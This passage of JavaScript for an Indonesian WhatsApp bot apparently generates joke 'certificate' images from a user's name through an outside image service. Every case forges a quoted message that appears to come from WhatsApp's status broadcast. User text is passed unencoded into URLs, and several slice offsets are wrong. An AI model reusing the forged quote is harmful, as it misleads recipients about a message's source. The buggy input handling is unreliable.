				anu = await getBuffer(`https://onlydevcity.xyz/AnakHaramSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'hekelserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}hekel Akira*`)
				reply(ind.wait())
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/HekerSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'babuserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}babu Akira*`)
				reply(ind.wait())
				ct = body.slice(10)
				anu = await getBuffer(`https://onlydevcity.xyz/BabuSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'ffserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(8)
				anu = await getBuffer(`https://onlydevcity.xyz/EpepSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'bucinserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/BucinSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'bocilepepserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/CilEpepSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'gayserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(9)
				anu = await getBuffer(`https://onlydevcity.xyz/GaySerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pacarserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/PacarSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'sadboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/SadBoySerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'surgaserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/SurgaSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pinterserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti Akira`)
				reply(ind.wait())
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/PintarSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'badgirlserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}badgirlserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/BadGirlSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'badboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}badboyserti Akira`)
				reply(ind.wait())
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/BadBoySerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'goodgirlserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodgirlserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/GoodGirlSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'goodboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodboyserti Akira`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/GoodBoySerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'editodserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}editodberkelasserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(20)
				anu = await getBuffer(`https://onlydevcity.xyz/EditorBerkelasSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'goodlookingserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodlookingserti Akira`)
				reply(ind.wait())
				ct = body.slice(17)
				anu = await getBuffer(`https://onlydevcity.xyz/GoodLookingSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'fuckboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fucekboyserti Akira`)
				reply(ind.wait())
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/FucekBoySerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'jametserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fucekboyserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/JametSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'youtuberserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}youtuberserti databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/YoutuberSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'fftourserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti/img.php?nama=${ct}`)
